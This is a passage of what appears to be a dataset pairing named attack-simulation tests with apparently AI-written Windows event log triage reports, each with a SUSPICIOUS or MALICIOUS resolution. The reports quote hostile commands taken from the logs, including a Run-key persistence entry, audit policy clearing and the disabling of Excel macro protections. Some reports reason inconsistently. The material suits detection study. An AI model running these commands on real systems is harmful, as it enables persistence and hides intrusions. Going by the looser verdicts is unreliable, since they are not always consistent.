   - `WmiPrvSE.exe` is seen, which is a Windows process essential for numerous tasks; could be used legitimately, but also frequently leveraged by attackers for stealthy operations or payload deployment through WMI scripts.

#### Indicators of Malicious Activity:
- **Time Manipulation:** While time change events can occur under regular system maintenance or updates, the presence of closely followed security events and kernel general events can suggest malicious reasons like log tampering or avoidance of timestamped security mechanisms.
- **Command Line with Alternate Data Streams:** The execution command related to cmd.exe indicates a potential malicious attempt to obscure operations or embed data.
- **Privileged Operations:** Assignment of high-privilege rights is a typical stage for executing further attacks, suggesting the need for closer investigation.
- **Repeated Logging Event Tools:** Frequent executions of event-log related utilities (like `wevtutil.exe`) suggest possible tampering with logs to remove traces or extract log data stealthily.

### Assessment and Resolution:
After analyzing the logs:
- **Assessment:** The logs illustrate multiple anomalies, such as system time manipulation, potentially suspicious usage of alternate data streams in command execution, and repeated privileged session establishment.
- **Threats/Risks Identified:**
  - Potential tampering or alteration of system time to hide activities.
  - Possible privilege escalation or setup for further malicious actions based on the special privileges assigned.
  - Use of alternate data streams indicating an attempt to hide data or commands.
  - Possible tampering with or extraction of event logs.

### Resolution: **SUSPICIOUS**
- Although no direct evidence of a specific malicious payload was found, the combination of suspicious time changes, privilege assignments, and suspicious command executions justifies further investigation.
  
### Guidance on How to Proceed:
- **Review User Activity:** Conduct a thorough review of `admin_test` account activities around these logs, particularly focusing on command line inputs and session durations.
- **Examine Time Change Justifications:** Determine whether the time changes were part of any maintenance or update operations. Investigate any service or manual intervention logs to cross-reference legitimacy.
- **Analyze System Restoration Points and Backups:** To further confirm any changes made during periods which involved time alterations.
- **Increase Monitoring:** Set alerts for further instances of these behaviors, especially regarding svchost.exe and process initiation logs.
- **Scan for Malware:** Perform a comprehensive threat scan on the system to detect any malware potentially leveraging scripts or disguised binaries.

Taking proactive steps in monitoring and forensic analysis will be crucial to confirm or rule out any real threats."
Hidden Window-Conhost Execution,"Here is a detailed analysis of the logs provided:

- **Sysmon Log Analysis:**
  - Execution of `hostname.exe`, `conhost.exe`, and `whoami.exe` under the user `SERVER002\admin_test` is observed. These commands are typical Windows utilities and their presence alone does not imply malicious behavior.
  - The presence of `wevtutil.exe` used by `SERVER002\admin_test` could indicate tampering with event logs, which is suspicious behavior, but not definitive of malicious activity without additional context.
  - The execution of `powershell.exe` with the command line `""powershell.exe"" & {conhost.exe --headless calc.exe}` is unusual. This command launches `calc.exe` (Windows Calculator) via `conhost.exe` in a headless mode, suggesting a technique that might be used to run processes without creating a visible window. While not inherently malicious, such behavior can be associated with evasion tactics.
  
- **System Log Analysis:**
  - Time adjustment events are present, indicating changes to the system time. This can occur for legitimate reasons, such as time synchronization with a time server, but could also be a tactic to evade detection by altering timestamps. The presence of these logs following potentially suspicious PowerShell activity adds to their significance.
  
- **Windows PowerShell Log Analysis:**
  - The logs confirm the execution of PowerShell script running `conhost.exe` in a headless mode with `calc.exe`. This operation appears to be a deliberate execution of a script which, without further evidence, could be benign but is more likely to be suspicious due to the nature of the command.

- **Security Log Analysis:**
  - Security logs reflect a lack of significant authentication failures or privilege escalation events. However, they do show time changes, corroborating the Sysmon logs and tying back to potential manipulation.

- **Application Log Analysis:**
  - No relevant events provided in the data.

**Conclusion:**
Based on the combination of atypical command usage, especially involving PowerShell executing `conhost.exe --headless calc.exe`, and potential log tampering signified by the use of `wevtutil.exe`, the observed activities are not conclusively benign or malicious. They warrant further investigation to determine intent and origin.

**Resolution:** SUSPICIOUS. Further investigation involving:
- Review of recent changes and scheduled tasks.
- Checking configurations and usage patterns for `admin_test`.
- Assessing file integrity and logs for tampering.
- Monitoring for additional unusual PowerShell activities for any signs of script-based attacks."
NetWire RAT Registry Key Creation,"Upon reviewing the provided Windows event logs, several observations and potential concerns were identified that warrant further attention:

1. **Observation of Registry Modifications**:
   - A sequence of commands involving modifications to the Windows Registry was observed. These commands add entries to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. This activity is often associated with persistence mechanisms used by malicious actors to ensure malware execution upon system boot:
     ```plaintext
     reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v script /t REG_SZ  /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f
     ```

2. **Process Execution by High-Integrity User**:
   - These registry modifications are executed by `cmd.exe` running under the `SERVER002\admin_test` user with high integrity. This implies administrative privileges were used, raising the risk level as typical users should not have such privileges unless necessary:
     ```plaintext
     User: SERVER002\admin_test, IntegrityLevel: High
     ```

3. **Execution of Legitimate Tools in Suspicious Contexts**:
   - Several executions of system tools (`whoami.exe`, `conhost.exe`, `hostname.exe`, `cmd.exe`, `reg.exe`) occurred in close temporal proximity, suggesting potential script or process automation.
   - The execution of `whoami.exe` and `cmd.exe` to check system details and execute commands are typical in both administrative and malicious contexts. The specific sequence and operations suggest it could be part of an automated malicious script to gain persistence.

4. **Multiple `wevtutil.exe` Process Executions**:
   - `wevtutil.exe` is frequently used by attackers to clear event logs. However, the logged usage appears benign if tied to regular system maintenance or legitimate updates. A deep dive into these processes and their purpose is advisable to clarify their intent.

5. **Time Modification Events**:
   - Several events indicate changes to system time through `svchost.exe`. These could be legitimate, perhaps related to time synchronization services, but should be verified, especially if correlating to the execution of malicious scripts.

6. **Edge Update Activity**:
   - Numerous updates related to Microsoft Edge were logged (`MicrosoftEdgeUpdate.exe`). The entries indicate regular update checks and activity. These appear routine but should be verified against scheduled update policies to ensure they are legitimate and not being misused as a cover for malicious actions.

### Assessment
Based on the analysis of these events, the logs contain actions characteristic of potential malicious activity, primarily due to the registry modifications aimed at achieving persistence and the high-integrity context in which they were executed. While some activities, like updating Microsoft Edge, appear benign, the overall risk profile demands further investigation to confirm intentions, particularly the automation script executing registry commands.

### Resolution
**SUSPICIOUS** - The logs contain activity that doesn't look right and necessitates further investigation, particularly around the use of high-integrity admin accounts for registry modifications, which is potentially malicious.

### Guidance on Proceeding
1. **Investigate User Accounts**: Verify the activity and purpose of the account `SERVER002\admin_test` and review any subsequent or related actions taken by this user.
2. **Conduct Malware Analysis**: Examine the file `C:\Users\admin\AppData\Roaming\Install\Host.exe` for signs of malicious behavior.
3. **Audit Registry and Startup Entries**: Assess any additional modifications around startup folders and registry entries.
4. **Temporal Analysis of Time Changes**: Cross-reference time change events with other logs to identify potential concealment of actions through time manipulation.
5. **Deep Dive into `wevtutil.exe` Usage**: Verify the intent behind the executions of `wevtutil.exe`.
6. **Review Update Procedures**: Ensure that Microsoft Edge updates align with expected organizational policy.

These steps will help clarify if the suspicious activities culminate in a confirmed security incident."
Disable Microsoft Office Security Features,"Upon review of the provided Windows event logs, there are several points of interest that merit further attention:

1. **Sysmon Log Analysis:**
   - There are multiple instances of common Windows utilities being executed, such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe`. These utilities themselves are not inherently malicious, but their usage and frequency might suggest further investigation if the behavior is non-standard in the context of this environment.
   - A notably suspicious entry involves the execution of `powershell.exe` with commands to modify Windows Registry settings related to Microsoft Office Excel Security settings. This particular use of PowerShell to alter security settings (i.e., setting `VBAWarnings` and disabling Protected View options) could potentially indicate an attempt to weaken security configurations, possibly to facilitate further malicious actions such as macro-based attacks.

2. **System Log Analysis:**
   - Routine Windows Update activity is observed, with security intelligence updates for Microsoft Defender Antivirus. No anomalies are immediately apparent from these logs.

3. **Security Log Analysis:**
   - Typical logon activity is noted, particularly a logon session by `NT AUTHORITY\SYSTEM` (event IDs 4624 and 4672). This is consistent with system-level processes and background services. The elevated privileges associated with these log-on sessions reflect trusted system processes.

4. **Application Log Analysis:**
   - Logs indicate the stopping of the `edgeupdate` service, which may warrant a closer look if this action is unusual for the system's configuration or scheduled tasks.

5. **PowerShell Log Analysis:**
   - PowerShell execution entries confirm the script activity seen in the Sysmon logs concerning altering registry settings. This script is executed with high integrity level, suggesting administrative or elevated user capability, which raises the risk profile of the action.

**Assessment:**
The modification of registry settings related to Excel security by PowerShell scripts without a clear business justification could be an indicator of potential malicious activity, particularly in disabling security features. While this alone does not confirm malicious intent, it raises concerns about the security posture and possible misuse of administrative privileges to weaken a system's defenses.

**Resolution: SUSPICIOUS**
The logs display activity that warrants further detailed investigation to confirm intent, particularly focusing on:
- Justifications and origins of the PowerShell script running the registry modifications.
- Verification of whether these modifications align with IT policy or were performed by a legitimate trusted user.
- Reviewing user `admin_test` activities for context, including any connections to external networks or abnormal behaviors.

**Recommended Actions:**
- Conduct a deeper forensic analysis of the PowerShell script's origin.
- Monitor and audit the account `SERVER002\admin_test` for any unauthorized activity.
- Ensure no unauthorized applications or services have been installed or altered on the system.
- Review system security policies and reinforce protective measures to prevent unauthorized changes to registry settings."
Malware Masquerading and Execution from Zip File,"Based on the analysis of the provided logs, here are some observations and findings:

### Windows PowerShell Log Analysis

1. **PowerShell Execution**: There is evidence of a PowerShell command that unpacks a ZIP archive (`Expand-Archive`) located in the `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\data.zip` and runs a `README.cmd` file. This behavior is noteworthy because:
   - The execution path involving `..` to access `Externalfiles` is unusual and could be an attempt to execute files from an insecure location.
   - The execution of a `cmd` file (`README.cmd`) directly after expanding a ZIP archive might be characteristic of a script that facilitates the execution of malware.

### Security Log Analysis

1. **Privilege Escalation (Event ID: 4672)**: The user `admin_test` was granted a high set of privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges are powerful and can be exploited to carry out malicious activities.
2. **Logon Event (Event ID: 4624)**: The `admin_test` user logged in via a network with NTLM authentication. While this could be benign, it's combined with the privilege escalation event and should be further scrutinized.

### System Log Analysis

1. **Windows Update Events**: The logs show updates related to Microsoft Defender. This is standard and does not indicate any malicious behavior.

### Application Log Analysis

1. **Edge Update Activity**: There are entries related to the `edgeupdate` service. While benign updates happen, the execution of setup files like `EDGEMITMP_05D32.tmp\setup.exe` aligns with legitimate activities as long as this update is expected.

### Sysmon Log Analysis

1. **Process Creation**:
   - **CMD and Rundll32 Execution**: The sequence where `cmd.exe` runs `README.cmd` and subsequently `rundll32.exe` executes a DLL (`2.dll, StartW`) needs attention. The use of `rundll32.exe` in this context is a common technique employed by attackers to execute malicious code within DLLs.
   - **Numerous Edge Update Executables**: Multiple Edge Update setup operations (`setup.exe`) are observed. While this can match typical update behavior, it requires validation against expected operations.

### Assessment

- **Suspicious Indicators**: The use of PowerShell to unpack and execute scripts from a potentially insecure directory (`..\\Externalfiles`), the subsequent execution of `cmd.exe` and `rundll32.exe`, and the privilege escalation steps suggest suspicious behavior that necessitates further investigation.
- **No Concrete Malicious Activity**: There is no definitive proof of malicious activity. The observed events could be benign, especially if they correlate with authorized user actions or expected software updates.

### Resolution

**SUSPICIOUS**: The logs contain activities that warrant additional investigation, particularly related to the PowerShell script execution and the processes triggered by the script, which could potentially lead to a compromise. It is advised to verify the legitimacy of the PowerShell execution and review any user activities around that time for potential unauthorized actions.

### Guidance on How to Proceed

1. **Verify PowerShell Script Purpose**: Confirm the origin and intent of the script executed via PowerShell. Check if this activity is part of a scheduled, legitimate deployment or maintenance task.
2. **Audit User Activities**: Review recent actions of the `admin_test` user, especially focusing on remote login activities and privilege escalations.
3. **Review Change Management Logs**: Ensure the observed activities align with approved change management logs, particularly around software updates and scripts execution.
4. **Isolate and Analyze DLL**: If possible, locate the `2.dll` file used in the `rundll32.exe` command and analyze it for malicious content.
5. **Monitor for Recurrent Patterns**: Set alerts to monitor for similar patterns of activity on the network to promptly identify potential threats in the future."
Clear Windows Audit Policy Config,"Upon reviewing the provided Windows event logs, the following analysis is conducted:

### System Log Analysis
- Time adjustments related to Windows Time Service and Kernel-General are recorded. The adjustments seem normal, as time synchronization occurs commonly in systems to maintain accuracy.

### Security Log Analysis
- Event ID 4672 indicates that the `admin_test` account was granted special privileges, including `SeDebugPrivilege`, which is common for administrative actions. Not inherently suspicious unless unauthorized privilege escalation is suspected.
- Event ID 4624 captures successful logins with NTLM authentication for the `admin_test` account, originating from IP `192.168.0.102`. This could be a normal activity if expected, but raises eyebrows as it suggests remote access.
- Event ID 4719 and Event ID 4634 involve policy changes which coincided with the logging actions of the `admin_test` account, possibly attempting to cover tracks. This activity often coincides with unauthorized access for malicious purposes.

### Sysmon Log Analysis
- Multiple instances of `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `auditpol.exe` were run by the `admin_test` account.
- `cmd.exe` executed commands to clear and remove audit policies (`""cmd.exe"" /c auditpol /clear /y & auditpol /remove /allusers`). This could indicate an attempt to disable logging to hide malicious actions.
- Execution of `auditpol.exe` with parameters to clear and remove audit policies further suggests intent to obfuscate activities, which is a significant red flag.
- `hostname.exe` and `whoami.exe` were executed, possibly as reconnaissance to gather information about the system.

### Application Log and PowerShell Log
- Minimal to no relevant information captured in the application or PowerShell logs.

### Assessment:
There are significant indicators of potential compromise. Specifically, the combination of privilege escalation, remote login, and actions to manipulate audit policies strongly suggest malicious intent. The activities seen with `auditpol.exe`, `cmd.exe`, `wevtutil.exe`, and privilege grants are common in post-exploitation scenarios where attackers attempt to ensure persistence and cover traces.

### Resolution:
**MALICIOUS**

### Guidance:
Given the observed activities, immediate actions should be taken:
1. Isolate the impacted system `Server002` from the network to prevent further access.
2. Conduct a comprehensive sweep for indicators of compromise across the network to identify other potentially affected systems.
3. Review recent changes in user accounts, particularly `admin_test`, for unauthorized modifications.
4. Assess if legitimate users had anticipated access patterns from IP `192.168.0.102`.
5. Reinforce logging mechanisms and audit policy enforcement to prevent similar incidents.
6. Analyze network and security controls to ensure they detect and prevent unauthorized privilege escalation and remote connections.
7. Apply security patches and review user access controls.

Overall, the logs showcase a coordinated effort potentially tied to an unauthorized access attempt or security breach. Prompt mitigation steps and a thorough investigation are warranted."
Create and start VirtualBox virtual machine,"Upon detailed analysis of the provided Sysmon event logs, here's the breakdown of potentially suspicious and anomalous activities:

1. **PowerShell and Wevtutil Usage:**
   - The log shows multiple instances of PowerShell being executed (`powershell.exe`) [ProcessId 5724]. This, in itself, could be normal; however, without additional context or command-line arguments, it requires additional scrutiny, especially since PowerShell is often used in initial foothold attacks.
   - The repeated execution of `wevtutil.exe` by the same user `SERVER002\admin_test`. `wevtutil.exe` is typically used to manage event logs, which might indicate a cleanup attempt or log deletion, potentially to erase traces of malicious activities.

2. **Command Execution from CMD with VirtualBox:**
   - The execution of `cmd.exe` [ProcessId 4856] with a command to create and start a VirtualBox virtual machine (`VBoxManage.exe`) is recorded. This action, while not inherently malicious, can indicate the establishment of an isolated execution environment, potentially for illicit activities.

3. **Process Chaining with High Privileges:**
   - Several processes show a chain of executions with high integrity levels, starting from PowerShell, moving to `wevtutil.exe`, and `cmd.exe`, executed by `SERVER002\admin_test`. This might indicate that an administrative account was used for possibly unintended purposes.

4. **Whoami and Hostname Execution:**
   - Execution of `whoami.exe` and `hostname.exe` suggests active information gathering and could be indicative of further activities to understand the privileges, current system user context, and network identity.

5. **Software Update Processes:**
   - `Microsoft Edge` update processes are present, running under `NT AUTHORITY\SYSTEM`. While these processes appear legitimate and match typical software update activity by Microsoft, their appearance in the logs should be correlated with any actual update plan to confirm legitimacy.

**Assessment and Recommendations:**

- The logs show multiple usages of powerful scripting and logging utilities in a condensed time frame, alongside system information gathering. Such behavior is often associated with post-exploitation routines when an attacker is already operating under privileged access.
- The specific combination and sequence of commands, especially involving the creation and use of virtual machines without apparent legitimate reasons, increase the suspicion level.
- On the basis of the logs provided and without additional context from other logs such as Security, Application, or PowerShell logs, the execution pattern appears **SUSPICIOUS**.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**

1. Investigate the rationale behind the use of VirtualBox and ensure it aligns with authorized use cases.
2. Conduct a deeper audit of the user account `SERVER002\admin_test` to verify the legitimacy of administrative commands executed.
3. Cross-reference other historical logs and conduct threat hunting for any new administrative script or scheduled task executions.
4. Enhance monitoring by enabling PowerShell script block logging to gain insights into what scripts/commands are being run.
5. Verify if there was any authorized patch management activity during the indicated times for the Edge updates to rule out misuse.
6. Consider implementing stricter access controls and regular reviews of admin access usage to prevent potential misuse."
Activate Windows NoControlPanel Group Policy Feature,"**Analysis of Windows Event Logs**

After thoroughly reviewing the provided logs, here are the key observations:

1. **System Log**:
   - The time synchronization event from the Windows Time Service (Event ID 35) indicates that the system is synchronizing with ""time.windows.com"". This event is normal for maintaining proper system time and does not indicate malicious activity.

2. **Application Log**:
   - The entries for `edgeupdate` services being stopped do not raise immediate concerns, as this could be part of normal behavior when the service is not needed or during updates. However, repeated stops in quick succession could be unusual but not inherently malicious without further context.

3. **Sysmon Logs**:
   - **Whoami Execution**: Multiple instances of `whoami.exe` are being executed. While `whoami` is a legitimate utility to display logged user information, frequent execution, especially within a short time span, may suggest user enumeration activity. 
   - **Registry Modification**: A `cmd.exe` process executed with a command to modify the registry (specifically disabling the Control Panel for the current user). \ 
  `CommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /t REG_DWORD /d 1 /f` 
    - This is considered suspicious as it attempts to modify system behavior – typically an action seen in configurations meant to restrict user control.
   - **Edge Update Executions**: Multiple instances of the Microsoft Edge Update executable running, including actions like `/update`, `/regsvc`, and `/regserver`. While these actions seem typical of auto-updates, the sheer volume and frequency could conceal malicious behavior like software tampering if not authorized.
   - **Execution of `reg.exe`, and `cmd.exe`**: Similar to other processes, `reg.exe` was executed to modify the registry, which is consistent with the command executed by `cmd.exe`.
   
4. **Indicators of Compromise**:
   - Frequent execution of `whoami` and the registry modification stand out as potentially indicative of malicious activity, particularly in environments where user account enumeration and policy restrictions are not routine.

**Assessment and Recommendations**:
- **Resolution: SUSPICIOUS**
  - The combination of frequent `whoami` executions, registry modifications to limit user access, and multiple `edgeupdate` activities, albeit could be routine, warrants deeper investigation. These events could potentially signify a compromised host trying to enumerate privileges and restrict user capabilities, potentially as part of a lateral movement or restriction strategy.
- **Next Steps**:
  - Review user account behavior, especially the `admin_test` account.
  - Verify the source and legitimacy of the changes made to the registry.
  - Investigate the Edge Update executions to confirm that updates are legitimate and not attempts to run malicious code.
  - Conduct a comprehensive audit for any unauthorized changes or policy amendments.
- Collaboration with IT and network teams to monitor for unusual network activity from this host might also reveal additional context about recent interactions or data transfer potentially associated with this suspicious behavior."
BlackByte Ransomware Registry Changes - CMD,"After a detailed analysis of the provided Windows event logs, the following observations and assessments are made:

1. **Sysmon Logs:**
   - Multiple executions of system utilities such as `wevtutil.exe`, `conhost.exe`, and `cmd.exe` by the user `SERVER002\admin_test`. While these can be used for administrative purposes, their frequent and automated-like execution could indicate script usage or automation, which warrants further investigation.
   - Command-line execution of `cmd.exe` with registry modification commands is particularly noteworthy:
     - Command involves adding registry keys such as `LocalAccountTokenFilterPolicy` and `EnableLinkedConnections`. These are often related to network access configurations.
     - While not inherently malicious, registry modifications like this can be indicative of post-exploitation activities or preparation for further access.
   - The execution of `whoami.exe` and `hostname.exe` suggests possible reconnaissance activities to gather system or user information.

2. **System Logs:**
   - These logs show routine activity such as time synchronization changes initiated by `svchost.exe`, which appear to be normal system behavior.

3. **Security Logs:**
   - Time change events logged as processed by `svchost.exe` indicate a change in the system clock, but no suspicious user activity was noted in these logs.

4. **Application Logs:**
   - References to Microsoft Edge Update service and related processes. These indicate routine application update activities.
   
5. **PowerShell Logs:**
   - Not provided in the collected logs.

**Assessment:**
The most suspicious activities are the repeated use of system utilities such as `wevtutil.exe` and registry modifications via `cmd.exe`. These could be part of legitimate administrative scripts or automation, but the registry changes pertaining to network policies could suggest preparatory steps for maintaining unauthorized remote access. The absence of indicators like known-bad hashes or execution from unusual directories lowers the immediate suspicion of overt malware activity.

**Resolution:** 

**SUSPICIOUS** 

**Guidance:**
- Verify if the administrative actions, particularly the registry modifications, are part of a recognized IT policy or executed by automated scripts approved by IT administration.
- Consult with the `admin_test` account user to confirm the legitimacy of the activities.
- Review any associated security policies or user access logs to ensure no unauthorized access.
- Consider implementing monitoring for further instances of similar command-line or utility execution, to detect potential misuse."
cacls - Grant permission to specified user or group recursively,"## Analysis of Windows Event Logs:

### Security Log:
- **Event ID 4616**: This indicates a change in the system time. The process responsible for this change is `svchost.exe`, which is commonly used in legitimate operations related to system time synchronization or update. The change in system time is relatively small, suggesting routine adjustments rather than malicious manipulation for obfuscation purposes.

### Application Log:
- **Event ID 16384 & 903**: These events are related to the Software Protection Platform Service, which is a standard Windows service. These entries do not present any overt signs of suspicious activity.

### System Log:
- **Kernel-General Event IDs 1 and 24**: These events also relate to changes in system time and timezone information. This is consistent with the observed behavior from the Security log, showing standard system operations rather than suspicious attempts to alter time logs maliciously.

- **Time-Service Event ID 35**: Indicates synchronization with an NTP server `time.windows.com`, which is a legitimate and expected activity for time synchronization.

### Sysmon Log:
- **Sysmon Event ID 1 (Process Creation)**: Several instances of `cmd.exe` and `conhost.exe` being executed. Additionally, there are instances where `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `icacls.exe` are run:
  - **Command Execution**: The presence of commands like `icacls.exe` is unexpected and potentially suspicious, as it involves changing permissions for a temporary directory. The use of commands such as `IF EXIST`, `mkdir`, and running utilities like `whoami` and `hostname` could signify an evasion tactic or scripting by an unauthorized party.
  - **User Integrity Level**: Commands are executed with a high integrity level, indicating privileged execution, which might be common in administrative scripts but can also be potential indicators of malicious scripts if out of normal behavior.

### Assessment:
- The sequence of operations related to `cmd.exe` executing conditional checks, directory operations, and permission changes to `/Temp` using `icacls.exe` are particularly noteworthy. Although `cmd.exe` and `conhost.exe` are legitimate processes, the contextual behavior around the commands can suggest potential abuse for unauthorized changes or persistence mechanisms.

### Conclusion:
- **SUSPICIOUS**: The operations detected deserve closer scrutiny due to the combination of processes being executed and the security context. This pattern reflects potential misuse or test scripting, which should be confirmed by evaluating its correspondence with approved administrative tasks or planned activities.

## Recommendations:
1. **Investigate the User Context**: Verify if `SERVER002\\admin_test` executed these commands as part of a legitimate task or script. Check with the user or associated department if this matches sanctioned activities.
2. **Review Scheduled Tasks and Scripts**: Check for any scheduled tasks or scripts associated with these activities to ensure they are intended and comply with security protocols.
3. **Audit Similar Events**: Look for other instances of similar commands on the system or across the network to determine if this is a recurring pattern.
4. **Validate Permission Changes**: Ensure that the changes made by `icacls` do not increase exposure to unauthorized access.
5. **Enhance Monitoring**: As a precaution, enhance monitoring for the affected and similar endpoints to detect similar activities promptly.

Proceed with further in-depth analysis depending on findings from these steps and evaluate the need for corrective action if any unauthorized actions are confirmed."
InstallUtil Uninstall method call - -installtype=notransaction -action=uninstall' variant,"### Analysis of Windows Event Logs:

#### Overview:
The event logs consist of various logs extracted from Security, Application, PowerShell, Sysmon, and System. The focus of the analysis is on identifying suspicious activities, unrecognized patterns, privilege escalations, and potentially malicious activities.

#### Findings:

1. **PowerShell Activity:**
   - A series of PowerShell commands were executed heavily around `2024-10-26 13:39:06.1617565`. The commands involved execution of scripts from `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\src\\InstallUtilTestHarness.ps1` and loading of assemblies. This is noteworthy due to its use of temporary directories and the conversion of files.
   - The PowerShell script is creating DLLs (`data.004.dll`), which is suspicious, especially as it uses InstallUtil capabilities for executing actions such as uninstall with significant command lines that avoid logging. InstallUtil is commonly misused in activity often seen in fileless malware.

2. **Sysmon - Process Execution:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and related processes are being run under `NT AUTHORITY\SYSTEM` around the same time frames. This could be a legitimate update process, but the concurrency of the activities makes it worth monitoring.
   - An instance of `InstallUtil.exe` is executed with command line parameters. As outlined, this program is running with command lines that are consistent with fileless malware patterns by executing a dynamically created DLL.
   - The PowerShell execution starts the dotnet compiler (`csc.exe`) and other utilities related to .NET resources. This establishes they are building or compiling code dynamically, which is unusual capture for an event log.

#### Indicators of Potentially Malicious Activity:
- **Temporary Directory Execution:** Execution of scripts and binaries from a temp directory is often an indicator of temporary or transitional malware activity since malware often uses such locations to minimize detection.
- **InstallUtil Exploitation:** Attempting to execute DLLs loaded by InstallUtil to perform unauthorized actions can be a method for executing malicious code while evading basic detection mechanisms.
- **User:** The suspicious actions are being conducted under `admin_test` and `SYSTEM` users, which indicate probable privileged level actions further suggesting possible unauthorized behavior.
  
#### Resolution:

**Resolution: SUSPICIOUS**
- The behavior observed within the PowerShell logs in conjunction with Sysmon logs indicate potentially suspicious activity. The use of known utilities like PowerShell, InstallUtil, and .NET compilers to execute scripts from a temp directory alongside dynamic assembly loading is behavior consistent with malicious intent, albeit not definitively confirmed without further detailed forensic investigation.
  
### Recommendations to Proceed:
1. **Immediate Further Investigation:**
   - Verify the legitimacy of the `InstallUtilTestHarness.ps1` script and the intended use behind executing the `data.004.dll`. Determine whether this activity was authorized or part of legitimate testing/deployment scenario.
   - Review the user permissions and process integrity for `admin_test` and determine any unauthorized access or behavior.

2. **Implement Sysmon Process Creation and Command Line Logging:**
   - Use Sysmon to log command lines and process creations to provide comprehensive insight into ongoing activities and for historical analysis.

3. **Perform Full System Scan for Indicators of Compromise (IOC):**
   - Utilize up-to-date antivirus/malware solution to scan the system.
   
4. **Engage Incident Response:**
   - Based on further findings and considering the potential risk, it may be prudent to engage an incident response team to conduct a detailed investigation and remediation.

By conducting these actions, you can establish whether the suspicious activities are part of authorized administrative tasks or if they represent a compromise needing a thorough incident response."
Register-CimProvider - Execute evil dll,"Upon reviewing the provided Windows event logs from the Sysmon and Application channels, several observations can be made about the system's activity on ""Server002"". These logs require careful analysis to determine any suspicious or malicious activity:

### Observations & Analysis

1. **Process Execution Patterns:**
   - Multiple executions of system utilities such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe` under the user account `SERVER002\\admin_test` are logged. These utilities are legitimate and commonly used for various administrative tasks. However, frequent, sequential use of utilities such as `wevtutil.exe`, which handles event logs, may require further context to ascertain the legitimacy of these actions.
   - There are several logs for `cmd.exe` executing with the command: `cmd.exe /c C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\Win32\\data.dll""`. This might indicate a script or command sequence intended for system management or potentially unauthorized change if out of ordinary routine tasks.

2. **Processes Executed with High Integrity Level:**
   - Some processes, such as `HOSTNAME.EXE` and `whoami.exe`, executed at a high integrity level, signify elevated permissions. This is typical within a controlled administrative session but should be ensured to be within the scope of usual administrative activities.

3. **Edge Update Activity:**
   - Continuous execution of `MicrosoftEdgeUpdate.exe` and related install and registration executables is observed with `NT AUTHORITY\\SYSTEM` privileges. This reflects likely automated updates for Microsoft Edge, which is typical behavior unless unmet policies or specific restrictions against such processes.
   - The EventID entries related to `edgeupdate` service show stops but lack further evidence of failure or anomalies suggesting issues besides routine update cycling.

4. **Security Product State:**
   - Windows Defender is reported to be active (`SECURITY_PRODUCT_STATE_ON`), indicating baseline security posture active during the log events.

### Conclusion and Resolution

**Assessment of the Situation:**

- The logs reflect potentially normal Windows system management commands and software updates. Activities such as using `wevtutil.exe`, `whoami.exe`, and `cmd.exe` are typical during legitimate administrative processes but should always be juxtaposed with routine operational procedures to rule out misuse.
- The Microsoft Edge update activity logs under system-level authority also appear typical for software update tasks. Regular and sequenced application updates/actions without notable fails suggest standard automated behavior.

**Resolution: SUSPICIOUS**

Given the context:

- While no definitive malicious activity is observed throughout these logs (such as clear indicators of compromise like account creation during off-hours or suspicious external connections), the log entries involving the use of administrative utilities and operations on event logs, especially the sequential nature, suggest potential misuse or activities outside standard practices that warrant a confirmation.
- However, the registration of a `.dll` file using `Register-CimProvider.exe` from a temporary path may pose a risk if not verified as part of sanctioned operations. This deserves further scrutiny and verification against standard tasks to rule out misuse or Trojan deployment in unusual dll registrations.

**Recommendations for Next Steps:**

1. **Confirm Legitimacy of DLL Registration:**
   - Validate the command usage of `Register-CimProvider.exe` by the `admin_test` account with the surrounding context of operations such as policy-defined software installations or maintenance tasks.
   
2. **Review Administrative Actions:**
   - Conduct in-depth scrutiny of administrative actions, focusing on the timing, context, and necessity of the executed commands/process logs involving `wevtutil`, `conhost`, and `cmd`. Ensure alignment with routine checks or patch management activities.

3. **User Account Management:**
   - Further review of `admin_test` activities, ensuring the account is used within policy and lacks any attempted privilege escalation signs outside permissible frameworks.

4. **Monitoring and Follow-Ups:**
   - Implement increased logging and alerting of similar admin commands execution and process creation, particularly within the corresponding timeframe or unusual hours, to promptly detect any deviations or mapped anomalies to broader risk frameworks."
Abusing MyComputer Disk Cleanup Path for Persistence,"Upon a detailed review of the provided logs, certain aspects of the entries stand out as suspicious and indicative of potential malicious activity:

1. **Reg.exe and Cmd.exe Commands**: 
   - The usage of `cmd.exe` to run `reg.exe` commands, specifically modifying registry keys, is often indicative of attempts to persistently modify the system. The following command was observed:
     ```
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\cleanuppath"" /t REG_EXPAND_SZ /d ""%systemroot%\system32\notepad.exe"" /f
     ```
   - This particular registry modification is linked to changing Explorer's cleanup path, which could be used for persistence mechanisms.

2. **Usage of Administrative Tools by Non-Standard Users**:
   - The frequent execution of utilities like `wevtutil.exe` and `cmd.exe` from a user account named `SERVER002\admin_test` warrants suspicion. These tools are typically used by administrators and their frequent execution can highlight malicious usage, especially when combined with other tools and scripts being run in a short period.

3. **Elevated Privileges**:
   - Certain processes, like `whoami.exe` and `hostname.exe`, were run with high integrity levels by the same `admin_test` user. The repetitive nature of such executions can indicate reconnaissance or credential gathering attempts.

4. **Event Correlation**:
   - The timing and frequency of these actions correspond to typical attack patterns where an attacker might attempt to ascertain user privileges or make adjustments to system settings and configurations leading to unauthorized privilege gaining activities or corrupt user sessions.

5. **Security Log Entries**:
   - The security log shows numerous logon events with elevated privileges and assignment of sensitive privileges like `SeDebugPrivilege` which allow for process inspection and modification at deeper system levels. Such privileges in the hands of a non-standard user can highlight potential misuse or compromise.

